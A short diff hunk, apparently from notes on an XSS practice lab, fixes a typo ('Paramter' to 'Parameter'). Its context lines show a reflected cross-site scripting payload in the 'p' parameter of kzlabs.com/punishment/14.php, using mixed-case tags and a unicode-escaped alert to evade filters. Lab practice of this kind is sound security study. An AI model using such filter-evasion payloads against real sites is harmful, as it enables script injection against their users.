@@ -3,7 +3,7 @@
 https://kzlabs.com/punishment/14.php
 
 
-Paramter p
+Parameter p
 
 https://kzlabs.com/punishment/14.php?p="><ImG sRc=x onerror=\u0061lert("XSS")>
 
